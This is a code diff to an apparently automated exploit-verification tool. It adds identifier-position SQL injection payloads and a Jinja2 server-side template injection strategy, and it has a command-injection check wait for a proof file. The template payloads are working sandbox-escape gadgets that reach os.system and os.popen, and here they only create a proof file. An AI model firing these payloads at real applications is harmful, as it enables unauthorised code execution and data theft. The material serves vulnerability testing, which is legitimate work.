@@ -171,8 +171,12 @@ class ExploitStrategy:
 # ---------------------------------------------------------------------------
 class _CmdInjection(ExploitStrategy):
     def verify(self, ctx, result):
-        if os.path.exists(ctx.proof_file):
-            return True, f"injected shell command created {ctx.proof_file}"
+        import time as _t
+        _dl=_t.time()+3.0
+        while _t.time()<_dl:
+            if os.path.exists(ctx.proof_file):
+                return True, f"injected shell command created {ctx.proof_file} (async settle)"
+            _t.sleep(0.1)
         return False, ""
 
 
@@ -310,6 +314,10 @@ CWE89 = _SqlInjection(
         # referenced table is auto-created with one seeded row in live mode).
         "1 UNION SELECT vulcan_proof() -- ",
         "1 UNION SELECT secret FROM vulcan_seed -- ",
+        # identifier-position (e.g. SELECT * FROM <param>): inert inside a quoted/value slot,
+        # fires only when the param is spliced as a bare table name (wsgidav CVE-2026-55509).
+        "vulcan_seed UNION SELECT vulcan_proof() -- ",
+        "vulcan_seed UNION SELECT secret FROM vulcan_seed -- ",
         "0) UNION SELECT vulcan_proof() -- ",
         "1=1 OR vulcan_proof() IS NOT NULL -- ",
         # (c) data-return exfil (needs output capture). A standalone SELECT for
@@ -496,4 +504,30 @@ CWE918 = _SSRF(
 )
 
 
-STRATEGIES = {s.cwe: s for s in (CWE78, CWE94, CWE89, CWE22, CWE502, CWE611, CWE918)}
+# CWE-1336 -- server-side template injection (Jinja2). Observable: a template
+# payload that ESCAPES the template environment to the Python runtime and
+# creates our proof file. Benign arithmetic ({{7*7}}) is deliberately NOT used
+# -- it renders in a sandbox too, so it cannot distinguish a safe (sandboxed)
+# render from a vulnerable (unsandboxed) one. Only a sandbox-escaping RCE
+# gadget can, which is what keeps this oracle sound.
+class _SSTI(ExploitStrategy):
+    def verify(self, ctx, result):
+        if os.path.exists(ctx.proof_file):
+            return True, f"SSTI->RCE: template payload escaped to the runtime and created {ctx.proof_file}"
+        return False, ""
+
+
+CWE1336 = _SSTI(
+    cwe="CWE-1336", name="server-side-template-injection",
+    goal=("inject a Jinja2 template expression that escapes the template "
+          "environment to the Python runtime and creates the file __PROOF__"),
+    templates=[
+        "{{ cycler.__init__.__globals__.__builtins__.__import__('os').system('touch __PROOF__') }}",
+        "{{ lipsum.__globals__.__builtins__.__import__('os').system('touch __PROOF__') }}",
+        "{{ cycler.__init__.__globals__.os.popen('touch __PROOF__').read() }}",
+        "{{ self.__init__.__globals__.__builtins__.__import__('os').system('touch __PROOF__') }}",
+    ],
+)
+
+
+STRATEGIES = {s.cwe: s for s in (CWE78, CWE94, CWE89, CWE22, CWE502, CWE611, CWE918, CWE1336)}
